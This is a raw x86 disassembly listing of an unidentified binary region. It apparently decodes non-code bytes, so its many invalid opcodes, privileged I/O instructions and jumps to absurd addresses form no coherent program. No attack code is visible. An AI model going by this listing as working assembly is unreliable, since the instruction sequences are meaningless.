  423d41:	iret   
  423d42:	xor    esp,0x4e
  423d45:	jge    0x423d55
  423d47:	lea    ebx,fs:[ebp+0x67c7dfb9]
  423d4e:	xor    ebx,DWORD PTR [edx]
  423d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d51:	adc    DWORD PTR [eax],eax
  423d53:	cmp    al,0xfe
  423d55:	les    ebx,FWORD PTR [ecx-0x7b]
  423d58:	imul   esp,DWORD PTR [edi+0x6143922e],0xe4cfcdd0
  423d62:	shl    DWORD PTR [edx+0x7d],1
  423d65:	inc    edi
  423d66:	fmul   QWORD PTR [edx+0x3a6e9137]
  423d6c:	enter  0xd384,0x54
  423d70:	repnz mov bl,0x3c
  423d73:	mov    dh,0xc3
  423d75:	ins    BYTE PTR es:[edi],dx
  423d76:	mov    ecx,0xd4ea4ee9
  423d7b:	cmp    BYTE PTR [edx-0x21],ch
  423d7e:	js     0x423d51
  423d80:	call   0x3ccf:0xc2f72b64
  423d87:	push   ecx
  423d88:	(bad)  
  423d89:	fwait
  423d8a:	cmc    
  423d8b:	div    DWORD PTR [ebx+eiz*4]
  423d8e:	sbb    eax,esp
  423d90:	sar    BYTE PTR ds:0x9a61b6ec,cl
  423d96:	xor    BYTE PTR [ecx+0x587419bc],al
  423d9c:	pop    esp
  423d9d:	mov    cl,0xa3
  423d9f:	cmp    eax,DWORD PTR [edi+0x4c]
  423da2:	pop    ebx
  423da3:	imul   eax,DWORD PTR [esi+0x11],0xdb3d1459
  423daa:	enter  0xf04c,0xc6
  423dae:	dec    esp
  423daf:	ret    0x54f1
  423db2:	add    al,0x87
  423db4:	mov    bh,0x15
  423db6:	xchg   esi,eax
  423db7:	retf   0x3c75
  423dba:	pop    ds
  423dbb:	js     0x423e22
  423dbd:	clc    
  423dbe:	cmp    bh,BYTE PTR [edx]
  423dc0:	retf   
  423dc1:	les    eax,FWORD PTR [eax]
	...
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	add    ebx,0x7f4cfc47
  423e46:	add    DWORD PTR [eax],eax
  423e48:	test   BYTE PTR [eax],0x0
  423e4b:	add    BYTE PTR [esi-0x50fb4b88],cl
  423e51:	and    al,0x5b
  423e53:	das    
  423e54:	into   
  423e55:	call   ebx
  423e57:	fisttp DWORD PTR [edi-0x7a]
  423e5a:	aaa    
  423e5b:	fdivr  QWORD PTR [ebp+0x35]
  423e5e:	jmp    0xba7:0x41013b4
  423e65:	or     eax,0x3ec513f
  423e6a:	sub    al,0x58
  423e6c:	inc    ecx
  423e6d:	adc    esi,DWORD PTR [ecx-0x18]
  423e70:	retf   
  423e71:	push   ebp
  423e72:	ret    
  423e73:	inc    ebp
  423e74:	pop    esi
  423e75:	mov    ds:0xb325f2fe,eax
  423e7a:	mov    cl,0x68
  423e7c:	test   BYTE PTR [eax],ch
  423e7e:	data16 mov al,0x2a
  423e81:	push   ss
  423e82:	call   0x1249f0d6
  423e87:	mov    esi,0x909c8918
  423e8c:	out    dx,al
  423e8d:	fs cli 
  423e8f:	adc    eax,0xe6092a44
  423e94:	mov    ?,WORD PTR [ebx]
  423e96:	jb     0x423e31
  423e98:	mov    cl,0x3
  423e9a:	jmp    0xa614:0x8ba267fe
  423ea1:	add    DWORD PTR [eax-0x4d],edx
  423ea4:	cmp    eax,0xc58f0791
  423ea9:	mov    ebp,ebx
  423eab:	pop    es
  423eac:	push   eax
  423ead:	(bad)  [ecx+0x3b]
  423eb0:	popf   
  423eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423eb2:	and    edx,DWORD PTR [edx]
  423eb4:	pop    ebp
  423eb5:	std    
  423eb6:	inc    ecx
  423eb7:	sub    dh,BYTE PTR [esi]
  423eb9:	fisub  WORD PTR [eax+0x30049539]
  423ebf:	sbb    BYTE PTR [ebp-0x2e],dh
  423ec2:	int3   
  423ec3:	jl     0x423f03
  423ec5:	popa   
  423ec6:	out    0x18,eax
  423ec8:	daa    
  423ec9:	in     eax,dx
  423eca:	xchg   edx,eax
  423ecb:	pop    sp
  423ecd:	mov    bh,0xdd
  423ecf:	sub    eax,0x92718136
  423ed4:	lahf   
  423ed5:	fidivr WORD PTR gs:[ebp+0x6d8a7e5d]
  423edc:	int    0xe0
  423ede:	sbb    DWORD PTR [ecx-0x53],edi
  423ee1:	inc    ebx
  423ee2:	icebp  
  423ee3:	and    DWORD PTR [edi+ebp*2],ebx
  423ee6:	xor    eax,0x9e43da00
  423eeb:	das    
  423eec:	push   esp
  423eed:	push   edi
  423eee:	mov    bh,BYTE PTR [esp+edi*2]
  423ef1:	sbb    DWORD PTR [ebp+0x20425f4f],ebx
  423ef7:	loop   0x423f71
  423ef9:	dec    esp
  423efa:	push   0xabd0d951
  423eff:	mov    DWORD PTR [ecx],edx
  423f01:	mov    al,0xc5
  423f03:	push   ecx
  423f04:	push   es
  423f05:	pop    edx
  423f06:	jp     0x423f4f
  423f08:	pop    esi
  423f09:	das    
  423f0a:	outs   dx,DWORD PTR ds:[esi]
  423f0b:	enter  0x4759,0x8f
  423f0f:	lock rcl BYTE PTR ds:0xae609bdb,1
  423f16:	out    0x8,al
  423f18:	xchg   esp,eax
  423f19:	ins    BYTE PTR es:[edi],dx
  423f1a:	ficomp DWORD PTR [edx-0x72b5fe36]
  423f20:	jae    0x423f7e
  423f22:	shl    BYTE PTR ds:0x365eebb1,0x14
  423f29:	fdiv   st,st(5)
  423f2b:	leave  
  423f2c:	pushf  
  423f2d:	jmp    0x5e77e394
  423f32:	mov    cl,0x7f
  423f34:	scas   eax,DWORD PTR es:[edi]
  423f35:	sbb    ebx,DWORD PTR [edi+0x55]
  423f38:	xor    BYTE PTR [ecx+0x75],ah
  423f3b:	aaa    
  423f3c:	jbe    0x423fa2
  423f3e:	lods   eax,DWORD PTR ds:[esi]
  423f3f:	sbb    eax,0xc6ed
	...
  423fb4:	inc    esi
  423fb5:	in     al,0x62
  423fb7:	mov    dl,ah
  423fb9:	mov    gs,esi
  423fbb:	out    dx,al
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x79],dh
  423fc1:	mov    ds:0x80427402,eax
  423fc6:	add    DWORD PTR [eax],eax
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    BYTE PTR [edi+0x6488c4b6],bh
  423fd1:	mov    dl,0xa3
  423fd3:	or     DWORD PTR [eax+0x1812f737],ecx
  423fd9:	shr    DWORD PTR [ebp+0x43],cl
  423fdc:	jg     0x423fc8
  423fde:	cmp    al,0x98
  423fe0:	test   eax,0x7dd75e8d
  423fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fe6:	cmp    dh,ah
  423fe8:	cld    
  423fe9:	clc    
  423fea:	inc    edx
  423feb:	jmp    0x9b9bbdd
  423ff0:	mov    eax,ds:0xbb425f5a
  423ff5:	and    al,0x9
  423ff7:	push   ecx
  423ff8:	cli    
  423ff9:	fdivr  DWORD PTR [ebp-0x3a]
  423ffc:	fisubr WORD PTR [edi]
  423ffe:	cmp    ah,ah
  424000:	mov    ch,0x3
  424002:	div    BYTE PTR [ebx]
  424004:	cmp    al,0xc1
  424006:	popf   
  424007:	popa   
  424008:	ja     0x423f8a
  42400a:	pop    es
  42400b:	cld    
  42400c:	je     0x423fa6
  42400e:	stos   BYTE PTR es:[edi],al
  42400f:	fcomp  DWORD PTR [ebx+0x1f]
  424012:	je     0x423fbf
  424014:	(bad)  
  424016:	gs inc eax
  424018:	xchg   esi,eax
  424019:	push   edx
  42401a:	xchg   ecx,eax
  42401b:	aas    
  42401c:	pop    ds
  42401d:	cmc    
  42401e:	add    DWORD PTR [edi],eax
  424020:	jmp    0xfea3:0x4476e47d
  424027:	fdiv   DWORD PTR [eax+0x34]
  42402a:	push   cs
  42402b:	fcomp  DWORD PTR [esi+0x5]
  42402e:	jmp    0x424048
  424030:	pop    ds
  424031:	fidivr DWORD PTR [ecx-0x5c09a9ca]
  424037:	sub    eax,0x3ea103ba
  42403c:	xor    BYTE PTR ds:0x5ce351ed,dh
  424042:	jmp    0x7f1e592d
  424047:	cmp    al,0x65
  424049:	add    BYTE PTR [esi],0x33
  42404c:	in     al,0xb7
  42404e:	sub    edi,DWORD PTR [esi-0x17297f75]
  424054:	aad    0xc5
  424056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424057:	scas   eax,DWORD PTR es:[edi]
  424058:	cmp    BYTE PTR ds:0x2f5648b,dh
  42405e:	jno    0x424093
  424060:	cmp    DWORD PTR [edi-0x40],0x4f43c867
  424067:	sbb    BYTE PTR [bp+si+0x0],cl
  42406b:	jp     0x424017
  42406d:	mov    cl,0x9a
  42406f:	cmp    eax,0xaca6fa8c
  424074:	xor    eax,0xec179e44
  424079:	jmp    0x2df85584
  42407e:	mov    edi,DWORD PTR [eax+0x2e]
  424081:	fnsave [eax-0x67a4190a]
  424087:	mov    WORD PTR [ecx+0x2deaeba0],fs
  42408d:	jo     0x4240f5
  42408f:	dec    ebp
  424090:	icebp  
  424091:	aad    0xe8
  424093:	into   
  424094:	push   0xffffffa2
  424096:	push   ebx
  424097:	mov    ds:0xb935413,al
  42409c:	leave  
  42409d:	and    eax,ecx
  42409f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240a0:	lahf   
  4240a1:	pop    ecx
  4240a2:	inc    ebp
  4240a3:	mov    bl,0x47
  4240a5:	or     cl,al
  4240a7:	add    BYTE PTR [edx+0x6b0f2c72],bl
  4240ad:	sbb    esp,ebx
  4240af:	mov    ds:0xbf6b5cb0,al
  4240b4:	popa   
  4240b5:	push   ecx
  4240b6:	xchg   BYTE PTR [edx+0x41ca2bc6],ah
  4240bc:	sbb    dh,dl
  4240be:	stos   DWORD PTR es:[edi],eax
  4240bf:	add    DWORD PTR [edx],edx
  4240c1:	cmp    eax,DWORD PTR [eax]
	...
  424133:	add    BYTE PTR [ecx-0xf],bh
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax+0x7dda7b6a]
  424142:	(bad)
  424146:	add    DWORD PTR [eax],eax
  424148:	test   BYTE PTR [eax],0x0
  42414b:	add    bh,bl
  42414d:	ins    BYTE PTR es:[edi],dx
  42414e:	mov    bh,BYTE PTR [edx-0x1d]
  424151:	ins    DWORD PTR es:[edi],dx
  424152:	push   ebp
  424153:	mov    dl,0x53
  424155:	js     0x4240f3
  424157:	retf   0xcd53
  42415a:	mov    dh,BYTE PTR [eax+0x303b7977]
  424160:	cwde   
  424161:	in     eax,dx
  424162:	ins    DWORD PTR es:[edi],dx
  424163:	in     eax,dx
  424164:	mov    gs:0x425dd7fe,eax
  42416a:	xchg   esi,eax
  42416b:	jmp    0x28b84c7a
  424170:	out    dx,al
  424171:	mov    BYTE PTR [edx+0x35],ah
  424174:	iret   
  424175:	push   esp
  424176:	int    0xa0
  424178:	mul    BYTE PTR [ecx]
  42417a:	add    BYTE PTR [eax-0x1d31510d],ah
  424180:	iret   
  424181:	push   esi
  424182:	mov    ebx,0xcd664903
  424187:	fisub  DWORD PTR [edi-0x5]
  42418a:	mov    al,ds:0xdefd329d
  42418f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424190:	and    BYTE PTR [ecx-0x6ee2fa35],ch
  424196:	test   DWORD PTR [edi-0x340d4ee0],eax
  42419c:	adc    eax,0x73e0de0f
  4241a1:	ds jge 0x4241ba
  4241a4:	setb   bl
  4241a7:	into   
  4241a8:	in     eax,0x6e
  4241aa:	fcmove st,st(2)
  4241ac:	xchg   ebp,eax
  4241ad:	xor    DWORD PTR [ebx-0x6a],ecx
  4241b0:	push   ebp
  4241b1:	xor    ch,0x97
  4241b4:	jg     0x4241b8
  4241b6:	sub    eax,0x6b35901
  4241bb:	push   esp
  4241bc:	je     0x4241d7
  4241be:	test   eax,0x3a5437cb
  4241c3:	sub    DWORD PTR [ebp+0x1d],ebp
  4241c6:	pop    ss
  4241c7:	add    DWORD PTR [ebx+0x79daf579],0xfffffff7
  4241ce:	xlat   BYTE PTR ds:[ebx]
  4241cf:	outs   dx,BYTE PTR ds:[esi]
  4241d0:	jae    0x42422f
  4241d2:	adc    DWORD PTR [ebx+edx*2+0x19911214],edi
  4241d9:	xor    ch,BYTE PTR [eax+eiz*4]
  4241dc:	mov    edi,0x286244ae
  4241e1:	add    cl,BYTE PTR [edx+0x5a94fd33]
  4241e7:	inc    ecx
  4241e8:	popa   
  4241e9:	push   edx
  4241ea:	or     al,0xc7
  4241ed:	pop    ss
  4241ee:	aad    0x31
  4241f0:	mov    edi,0xc945d28
  4241f5:	into   
  4241f6:	shl    BYTE PTR cs:[esi+0x5f1d4da5],cl
  4241fd:	outs   dx,DWORD PTR ds:[esi]
  4241fe:	imul   edx,DWORD PTR [esi+ebp*4],0x5fcab839
  424205:	push   es
  424206:	mov    ebp,0x39094b83
  42420b:	mov    WORD PTR [ecx+0x60],?
  42420e:	into   
  42420f:	leave  
  424210:	mov    BYTE PTR [esi+0x12],dh
  424213:	bound  edi,QWORD PTR [edi]
  424215:	mov    cl,0xbd
  424217:	std    
  424218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424219:	pop    es
  42421a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42421b:	sub    dl,BYTE PTR [edi]
  42421d:	gs pop edi
  42421f:	mov    DWORD PTR [ebx+0x9c86889],edi
  424225:	pop    ebp
  424226:	mov    cl,0x83
  424228:	pop    eax
  424229:	adc    BYTE PTR [esi+0x39e3792a],dl
  42422f:	jmp    0x3357:0xaba108da
  424236:	push   0x82b964b6
  42423b:	into   
  42423c:	aam    0xa7
  42423e:	std    
  42423f:	xchg   ebx,eax
  424240:	cmp    eax,0x40
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0xb86ba4bf,eax
  4242c2:	add    BYTE PTR [esi+ebp*1-0x7e],dl
  4242c6:	add    DWORD PTR [eax],eax
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    cl,al
  4242cd:	test   eax,0x1d26a23f
  4242d2:	xor    eax,0xb8d50b38
  4242d7:	(bad)  
  4242d8:	arpl   WORD PTR [ebx+eiz*2],bx
  4242db:	pop    ebx
  4242dc:	shl    esi,1
  4242de:	cld    
  4242df:	jmp    0x42432a
  4242e1:	(bad)  
  4242e2:	loopne 0x424287
  4242e4:	push   edx
  4242e5:	retf   0x1581
  4242e8:	stos   BYTE PTR es:[edi],al
  4242e9:	ja     0x42429f
  4242eb:	daa    
  4242ec:	rcl    DWORD PTR [esi+0x6162c297],0xb4
  4242f3:	mov    esi,0x48dd33d5
  4242f8:	addr16 push ebp
  4242fa:	jmp    0x424280
  4242fc:	mov    ah,0x13
  4242fe:	xor    edx,DWORD PTR [eax+edi*8-0x640a93af]
  424305:	push   edx
  424306:	push   esi
  424307:	add    DWORD PTR [esi-0x5fd88569],ecx
  42430d:	pop    eax
  42430e:	mov    cl,BYTE PTR ds:0xaee0b215
  424314:	push   ecx
  424315:	push   eax
  424316:	mov    cl,0x1f
  424318:	(bad)  
  424319:	mov    dh,0x73
  42431b:	aaa    
  42431c:	pop    ecx
  42431d:	pop    ebp
  42431e:	out    0x17,eax
  424320:	fadd   DWORD PTR [esp+esi*8+0x43]
  424324:	add    DWORD PTR ds:0xdc8ba385,0x30
  42432b:	jge    0x4242b5
  42432d:	scas   eax,DWORD PTR es:[edi]
  42432e:	jne    0x4243a8
  424330:	push   ebx
  424331:	adc    al,0x87
  424333:	xchg   BYTE PTR [ecx-0x19588970],ch
  424339:	and    bh,dl
  42433b:	xchg   edx,eax
  42433c:	repz mov ds:0xd7f6563b,eax
  424342:	rol    BYTE PTR [ebx],0x43
  424345:	adc    eax,0x7eda5d7d
  42434a:	xchg   edi,eax
  42434b:	aam    0x1f
  42434d:	data16 add BYTE PTR [edx],ah
  424350:	or     eax,0xd8bc557a
  424355:	push   ebx
  424356:	popf   
  424357:	aad    0x70
  424359:	push   ecx
  42435a:	push   ss
  42435b:	push   edi
  42435c:	minps  xmm5,XMMWORD PTR [eax]
  42435f:	xlat   BYTE PTR ds:[ebx]
  424360:	data16 int 0xc9
  424363:	jg     0x4242e9
  424365:	sbb    BYTE PTR [ebx+edx*2],0xce
  424369:	push   0x1d
  42436b:	cmp    BYTE PTR [edx+0x2068fc35],dl
  424371:	repz mov ebx,0x9bb933ee
  424377:	mov    al,BYTE PTR [esi-0x29]
  42437a:	(bad)  
  42437b:	icebp  
  42437c:	call   0xd5d3d438
  424381:	or     dl,BYTE PTR [ecx+0x56]
  424384:	xor    ecx,DWORD PTR ds:0xc00f6d9
  42438a:	cld    
  42438b:	or     ecx,ecx
  42438d:	lahf   
  42438e:	mov    bl,0x99
  424390:	or     ebx,ebx
  424392:	addr16 (bad) 
  424394:	(bad)  
  424395:	(bad)  [ecx+0x5549845b]
  42439b:	int    0xb7
  42439d:	mov    ah,0x6c
  42439f:	and    dh,BYTE PTR [ecx+0x1a594fa1]
  4243a5:	cmp    eax,0x380db255
  4243aa:	xchg   ebx,eax
  4243ab:	dec    ebx
  4243ac:	add    al,0x8b
  4243af:	jbe    0x4243a6
  4243b1:	loop   0x42436e
  4243b3:	dec    esi
  4243b4:	xchg   esp,eax
  4243b5:	dec    edi
  4243b6:	jbe    0x424426
  4243b8:	xchg   DWORD PTR [eax-0x77],edx
  4243bb:	std    
  4243bc:	cdq    
  4243bd:	mov    al,ds:0x8e583e4e
	...
  424432:	add    BYTE PTR [eax],al
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	shl    dl,1
  424442:	stc    
  424443:	in     eax,dx
  424444:	and    al,0x83
  424446:	add    DWORD PTR [eax],eax
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    BYTE PTR [ecx-0x4f19b3c7],dh
  424451:	dec    edi
  424452:	into   
  424453:	adc    DWORD PTR [ebp+0x6659897b],edi
  424459:	hlt    
  42445a:	mov    DWORD PTR [ebx],eax
  42445c:	iret   
  42445d:	mov    ?,esi
  42445f:	adc    ch,ah
  424461:	outs   dx,DWORD PTR ds:[esi]
  424462:	pop    esi
  424463:	stos   DWORD PTR es:[edi],eax
  424464:	push   edi
  424465:	out    0x57,eax
  424467:	call   0xf093d8e0
  42446c:	out    0xbb,eax
  42446e:	lods   al,BYTE PTR ds:[esi]
  42446f:	aas    
  424470:	or     al,0xb
  424472:	(bad)  
  424473:	push   ss
  424474:	mov    ecx,0x88a72c1a
  424479:	leave  
  42447a:	rol    ah,0x29
  42447d:	dec    esp
  42447e:	lds    ebp,FWORD PTR [ecx+0x52]
  424481:	mov    edx,0x7a66feb8
  424486:	jg     0x4244ba
  424488:	aad    0x49
  42448a:	jmp    0x7835:0x907543bb
  424491:	jmp    0xe62d:0xcde70f49
  424498:	cwde   
  424499:	mov    WORD PTR [eax+0x47c6077d],?
  42449f:	cwde   
  4244a0:	and    esp,esi
  4244a2:	or     ebp,DWORD PTR [ebx-0x5d828f0d]
  4244a8:	in     al,dx
  4244a9:	pop    ds
  4244aa:	xchg   edi,eax
  4244ab:	cmp    DWORD PTR [edx-0x4a50684f],ebx
  4244b1:	sbb    DWORD PTR [edx],ecx
  4244b3:	xor    esi,DWORD PTR [ebx+esi*1]
  4244b6:	(bad)  [esi]
  4244b8:	push   ss
  4244b9:	dec    esp
  4244ba:	mov    dl,BYTE PTR [edx+0x7ba29b72]
  4244c0:	xor    eax,0xa8999bb4
  4244c5:	xor    eax,0xe5f1fca4
  4244ca:	xchg   esi,eax
  4244cb:	mov    eax,0x8d39e0c9
  4244d0:	jmp    0x794aa7cf
  4244d5:	push   ebx
  4244d6:	adc    DWORD PTR [eax-0x6b],edx
  4244d9:	or     edx,DWORD PTR ds:0x3cd98b78
  4244df:	mov    ebp,0x3fdfb2cd
  4244e4:	imul   BYTE PTR [ebx+0x4274bd21]
  4244ea:	push   ds
  4244eb:	and    BYTE PTR [edi-0x1ddb18b6],al
  4244f1:	adc    al,0xf5
  4244f3:	or     DWORD PTR [ebx+0x17],edi
  4244f6:	sub    DWORD PTR [esi-0x24],edi
  4244f9:	pop    eax
  4244fa:	push   cs
  4244fb:	jae    0x4244a1
  4244fd:	mov    ch,0x4c
  4244ff:	jbe    0x424578
  424501:	in     al,dx
  424502:	mov    DWORD PTR [esi],ecx
  424504:	out    dx,eax
  424505:	or     BYTE PTR [edx+0x32fc8d83],bh
  42450b:	mov    fs,WORD PTR [ebx-0x6c]
  42450e:	punpckldq mm5,mm4
  424511:	mov    ebp,0xd4bbc2c3
  424516:	cld    
  424517:	xor    al,0x39
  424519:	not    BYTE PTR [eax+0x6]
  42451c:	ja     0x2e0fb569
  424522:	push   ebp
  424523:	ja     0x42450d
  424525:	emms   
  424527:	sub    bl,dl
  424529:	pop    ebx
  42452a:	daa    
  42452b:	mov    eax,ds:0xb03a421c
  424530:	jecxz  0x4244df
  424532:	push   esi
  424533:	sub    dh,al
  424535:	in     al,dx
  424536:	pop    ebx
  424537:	xor    ebx,edi
  424539:	sub    eax,0xacc0ce00
  42453e:	les    edx,FWORD PTR [ebp+0x4d83]
	...
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    DWORD PTR [ebx+0x1abec7ff],eax
  4245c5:	test   BYTE PTR [ecx],al
  4245c7:	add    dh,dh
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [ebp+0x65],ah
  4245ce:	push   ss
  4245cf:	jmp    0xc0d6:0xe59884aa
  4245d6:	test   al,0x5f
  4245d8:	mov    ebx,0x57ebea7b
  4245dd:	fbstp  TBYTE PTR [edi-0x52]
  4245e0:	aad    0x67
  4245e2:	(bad)  
  4245e3:	sbb    eax,0xd1e523a3
  4245e8:	xchg   BYTE PTR [ecx-0x25],ah
  4245eb:	push   es
  4245ec:	mov    BYTE PTR [eax+0x6a],dh
  4245ef:	add    BYTE PTR [ebx+0x3e26cf31],bl
  4245f5:	das    
  4245f6:	pop    ss
  4245f7:	ret    
  4245f8:	hlt    
  4245f9:	lea    esi,[edx]
  4245fb:	aam    0xa9
  4245fd:	aaa    
  4245fe:	and    bh,dl
  424600:	mov    fs,WORD PTR [edx-0x11]
  424603:	dec    ecx
  424604:	in     eax,dx
  424605:	cmp    BYTE PTR [eax],dh
  424607:	jecxz  0x4245b5
  424609:	outs   dx,BYTE PTR ds:[esi]
  42460a:	sbb    cl,BYTE PTR [eax+0x4b]
  42460d:	stos   BYTE PTR es:[edi],al
  42460e:	or     ah,bl
  424610:	icebp  
  424611:	std    
  424612:	xor    esi,DWORD PTR [esi+0x54171894]
  424618:	pushf  
  424619:	cli    
  42461a:	test   BYTE PTR [edx+0x36536dfb],cl
  424620:	aaa    
  424621:	out    0xab,al
  424623:	mov    ecx,ecx
  424625:	rcl    BYTE PTR [edx+0x61664f53],cl
  42462b:	ss in  al,dx
  42462d:	add    DWORD PTR [edx+0x2e],edi
  424630:	dec    edi
  424631:	jo     0x424614
  424633:	and    BYTE PTR [ebx],al
  424635:	pushf  
  424636:	loope  0x4246a8
  424638:	jl     0x4246a4
  42463a:	pop    edx
  42463b:	fsub   DWORD PTR [eax]
  42463d:	in     al,dx
  42463e:	xor    dh,BYTE PTR [edi]
  424640:	lods   al,BYTE PTR ds:[esi]
  424641:	lea    esp,[edx-0x25a34332]
  424647:	mov    al,0xfc
  424649:	pop    ds
  42464a:	loopne 0x424643
  42464c:	sbb    eax,0x77ab3181
  424651:	push   ss
  424652:	scas   eax,DWORD PTR es:[edi]
  424653:	xor    al,0x47
  424655:	loopne 0x42466d
  424657:	sub    esp,DWORD PTR [ebx]
  424659:	push   edi
  42465a:	pop    eax
  42465b:	sbb    BYTE PTR [esi],ch
  42465d:	cwde   
  42465e:	cli    
  42465f:	in     al,0xe5
  424661:	mov    ch,0x0
  424663:	outs   dx,DWORD PTR es:[esi]
  424665:	pop    edi
  424666:	sbb    BYTE PTR [ecx],0xb3
  424669:	fist   WORD PTR [edi]
  42466b:	hlt    
  42466c:	int3   
  42466d:	xlat   BYTE PTR ds:[ebx]
  42466e:	pop    ebp
  42466f:	xlat   BYTE PTR ds:[ebx]
  424670:	icebp  
  424671:	and    eax,0x66185f50
  424676:	jae    0x424621
  424678:	xor    BYTE PTR [edi-0x38],bh
  42467b:	imul   esi,DWORD PTR [eax],0xd
  42467e:	mov    ah,0x70
  424680:	mov    ?,ebp
  424682:	retf   
  424683:	sar    DWORD PTR [edi],0x5d
  424686:	shl    edx,0x72
  424689:	lods   eax,DWORD PTR ds:[esi]
  42468a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42468b:	pop    ss
  42468c:	mov    esi,0x1533e11c
  424691:	test   al,0x9a
  424693:	or     al,0x64
  424695:	lea    esp,[esi+0x652e6c70]
  42469b:	lea    ecx,[esi]
  42469d:	jl     0x424652
  42469f:	jecxz  0x4246ad
  4246a1:	cmp    BYTE PTR [esp+edi*1-0x60],dl
  4246a5:	jmp    0xf71f:0xd9ee41f3
  4246ac:	push   0xabd46784
  4246b1:	jae    0x42466a
  4246b3:	(bad)  
  4246b4:	imul   BYTE PTR [ebx+0xda34307]
  4246ba:	mov    cl,0x7b
  4246bc:	cmc    
  4246bd:	push   esp
  4246be:	xchg   ebp,eax
  4246bf:	call   0x0:0xfef3
	...
  424732:	add    BYTE PTR [eax],al
  424734:	xor    al,0x23
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fnsave ds:0x1029ab74
  424745:	test   DWORD PTR [ecx],eax
  424747:	add    dh,dh
  424749:	add    BYTE PTR [eax],al
  42474b:	add    bl,bh
  42474d:	sar    DWORD PTR [esi+ebp*1-0x6ee7ee89],cl
  424754:	fimul  WORD PTR [eax-0x46553894]
  42475a:	retf   
  42475b:	or     DWORD PTR [edx-0x612d6a9c],ecx
  424761:	cs (bad) 
  424763:	sbb    eax,0x40f43cb8
  424768:	hlt    
  424769:	dec    edi
  42476a:	cmp    dh,BYTE PTR [ecx-0x69]
  42476d:	out    0x8e,al
  42476f:	outs   dx,DWORD PTR ds:[esi]
  424770:	mov    ch,0x81
  424772:	sbb    eax,0xf720ce7f
  424777:	daa    
  424778:	pop    es
  424779:	mov    esi,0xcad9e219
  42477e:	fdivr  DWORD PTR [esi]
  424780:	cmc    
  424781:	stos   BYTE PTR es:[edi],al
  424782:	add    BYTE PTR [ebx],bl
  424784:	int3   
  424785:	add    cl,BYTE PTR [eax+0x11]
  424788:	cld    
  424789:	out    0xd,al
  42478b:	popa   
  42478c:	call   FWORD PTR ds:0x49ff25e8
  424792:	mov    al,0x70
  424794:	fnstcw WORD PTR [eax-0x48645cb6]
  42479a:	xor    eax,DWORD PTR [esi-0x5d8c0d3]
  4247a0:	mov    ds:0xee8d3ca9,eax
  4247a5:	leave  
  4247a6:	mov    eax,ds:0x2b6ba8
  4247ab:	push   edx
  4247ac:	shl    esi,0xd8
  4247af:	nop    DWORD PTR [edi]
  4247b2:	jae    0x4247f4
  4247b4:	pop    es
  4247b5:	xchg   ecx,eax
  4247b6:	ins    BYTE PTR es:[edi],dx
  4247b7:	idiv   BYTE PTR [edi]
  4247b9:	add    eax,0x96f21daf
  4247be:	mov    DWORD PTR [edx+0x72],eax
  4247c1:	pop    ecx
  4247c2:	mov    dh,0x2d
  4247c4:	fidiv  WORD PTR [edi-0x2b]
  4247c7:	pop    ss
  4247c8:	call   0x67e8f10e
  4247cd:	int3   
  4247ce:	dec    ebx
  4247cf:	retf   0xfcac
  4247d2:	iret   
  4247d3:	add    eax,0x323a42cf
  4247d8:	(bad)  
  4247d9:	push   edi
  4247da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247db:	repz sub al,0xc4
  4247de:	adc    BYTE PTR [ecx],0x80
  4247e1:	pop    ebp
  4247e2:	and    al,0xb2
  4247e4:	dec    ebx
  4247e5:	pop    esi
  4247e6:	jno    0x4247e6
  4247e8:	dec    esp
  4247e9:	sub    ah,dl
  4247eb:	loopne 0x42483c
  4247ed:	fimul  WORD PTR [ebp-0x1a]
  4247f0:	rdpkru 
  4247f3:	mov    WORD PTR [esi],ds
  4247f5:	(bad)  
  4247f6:	cmp    al,0x91
  4247f8:	loop   0x4247b6
  4247fa:	bound  ebx,QWORD PTR [edx+0x5e8aa0b1]
  424800:	add    ecx,DWORD PTR ds:0x6590a2b8
  424806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424807:	fs push 0xffffffd6
  42480a:	and    DWORD PTR [esi+0x1da9b7ae],ecx
  424810:	inc    esi
  424811:	jnp    0x42485d
  424813:	fild   DWORD PTR [ebp-0x58529e96]
  424819:	(bad)  
  42481a:	loope  0x42479e
  42481c:	imul   esi,DWORD PTR [ebx+edx*4-0x60],0x60
  424821:	lods   eax,DWORD PTR ds:[esi]
  424822:	and    ah,BYTE PTR [edx]
  424824:	mov    al,0x8f
  424826:	adc    BYTE PTR [edi-0x3b],bl
  424829:	and    dh,BYTE PTR [ebp+ebp*2-0x45f8b987]
  424830:	std    
  424831:	clc    
  424832:	out    0xb1,al
  424834:	mov    dh,0xe7
  424836:	popa   
  424837:	mov    ecx,DWORD PTR [ecx]
  424839:	cdq    
  42483a:	retf   
